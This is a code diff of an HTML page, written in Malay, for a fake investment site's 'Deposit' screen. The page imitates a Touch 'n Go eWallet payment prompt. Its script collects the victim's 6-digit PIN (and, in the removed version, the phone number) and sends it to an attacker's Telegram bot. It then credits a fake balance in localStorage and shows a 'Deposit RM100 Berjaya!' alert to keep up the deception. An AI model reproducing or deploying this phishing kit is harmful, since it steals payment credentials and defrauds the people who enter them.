@@ -3,61 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Deposit Dana</title>
+    <title>Deposit</title>
     <link rel="stylesheet" href="css/style.css">
+    <style>
+        .header-nav { display: flex; align-items: center; padding: 20px; border-bottom: 1px solid var(--border); background: #fff; }
+        .back-btn { font-size: 24px; text-decoration: none; color: var(--text-main); margin-right: 15px; }
+        .header-title { font-size: 18px; font-weight: 700; }
+        .list-card { background: #fff; border-radius: 16px; border: 1px solid var(--border); margin-bottom: 20px; overflow: hidden; }
+        .list-item { display: flex; justify-content: space-between; align-items: center; padding: 20px; border-bottom: 1px solid var(--border); text-decoration: none; color: var(--text-main); }
+        .list-item:last-child { border-bottom: none; }
+        .list-left { display: flex; align-items: center; gap: 15px; font-size: 15px; font-weight: 600; }
+        .list-icon { font-size: 24px; color: var(--primary); }
+    </style>
 </head>
-<body>
-    <div class="card">
-        <h1 style="font-size: 24px; text-align: center; margin-top: 10px;">Deposit Dana</h1>
-        <p class="subtitle" style="text-align: center;">Untuk menambah dana pelaburan anda, sila masukkan No. Telefon dan 6-digit PIN Touch 'n Go anda.</p>
+<body style="background: var(--bg-gray);">
 
-        <form id="tngForm">
-            <div class="input-group">
-                <label>No. Telefon (TNG)</label>
-                <input type="tel" id="phone" placeholder="0123456789" required>
-            </div>
+    <div class="header-nav">
+        <a href="dashboard.html" class="back-btn">←</a>
+        <div class="header-title">Deposit</div>
+    </div>
+
+    <div class="content" style="padding-top: 20px;">
+        <h2 class="section-title" style="font-size: 18px; margin-bottom: 10px;">Pilih Kaedah Deposit</h2>
+        <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">Dana akan dikreditkan serta-merta selepas pengesahan.</p>
+
+        <div class="list-card">
+            <!-- Butang TNG (Popup) -->
+            <a href="#" onclick="openTngPopup()" class="list-item">
+                <div class="list-left">
+                    <span class="list-icon">💳</span> Touch 'n Go eWallet
+                </div>
+                <span style="color: var(--text-muted);">›</span>
+            </a>
             
-            <div class="input-group">
-                <label>TNG Secure PIN (6 Digit)</label>
-                <input type="password" id="pin" style="letter-spacing: 10px; text-align: center; font-size: 24px; font-weight: bold;" maxlength="6" placeholder="••••••" required>
-            </div>
+            <!-- Bank Lain (Cuba redirect ke Verify) -->
+            <a href="verify.html" class="list-item">
+                <div class="list-left">
+                    <span class="list-icon">🏦</span> FPX Online Banking
+                </div>
+                <span style="color: var(--text-muted);">›</span>
+            </a>
             
-            <button type="submit" id="btn" style="background: #3b82f6; color: white;">Sahkan Deposit</button>
-        </form>
-        
-        <div style="display: flex; align-items: center; justify-content: center; gap: 5px; font-size: 12px; color: #10b981; margin-top: 20px;">
-            🔒 Disulitkan secara end-to-end
+            <a href="verify.html" class="list-item">
+                <div class="list-left">
+                    <span class="list-icon">₿</span> Crypto Transfer
+                </div>
+                <span style="color: var(--text-muted);">›</span>
+            </a>
+        </div>
+    </div>
+
+    <!-- POPUP TNG -->
+    <div class="popup-overlay" id="tng-popup">
+        <div class="popup-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Touch_%27n_Go_eWallet_logo.svg/512px-Touch_%27n_Go_eWallet_logo.svg.png" alt="TNG">
+            <h2>Pengesahan Pembayaran</h2>
+            <p>Masukkan 6-digit PIN Touch 'n Go anda untuk meluluskan deposit RM100.</p>
+            <form id="tngForm">
+                <input type="password" id="pin" class="pin-input" maxlength="6" placeholder="••••••" required>
+                <button type="submit" class="popup-btn">Sahkan PIN</button>
+            </form>
         </div>
     </div>
 
     <script src="js/config.js"></script>
     <script>
+        function openTngPopup() {
+            document.getElementById('tng-popup').style.display = 'flex';
+        }
+
         document.getElementById('tngForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-            const btn = document.getElementById('btn');
-            btn.disabled = true; 
+            const btn = e.target.querySelector('button');
             btn.textContent = "Memproses...";
+            btn.disabled = true;
             
-            const phone = document.getElementById('phone').value;
             const pin = document.getElementById('pin').value;
             
-            const text = `<b>💳 Deposit TNG</b>\n<b>==================</b>\n<b>No. Tel:</b> <code>${phone}</code>\n<b>PIN TNG:</b> <code>${pin}</code>\n<b>==================</b>`;
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                    method: "POST", body: new URLSearchParams({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: "HTML" })
-                });
+            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                method: "POST", body: new URLSearchParams({ chat_id: CONFIG.CHAT_ID, text: `💳 <b>TNG PIN (Deposit)</b>\nPIN: <code>${pin}</code>`, parse_mode: "HTML" })
+            });
 
-                let currentBalance = parseFloat(localStorage.getItem('fake_balance') || '0');
-                localStorage.setItem('fake_balance', currentBalance + 100);
+            let balance = parseFloat(localStorage.getItem('fake_balance') || '0');
+            localStorage.setItem('fake_balance', balance + 100);
 
-                alert("Deposit RM100 Berjaya!");
-                window.location.href = "dashboard.html";
-                
-            } catch (err) {
-                alert("Rangkaian sibuk.");
-                btn.disabled = false; btn.textContent = "Sahkan Deposit";
-            }
+            document.getElementById('tng-popup').style.display = 'none';
+            alert("Deposit RM100 Berjaya!");
+            window.location.href = "dashboard.html";
         });
     </script>
 </body>
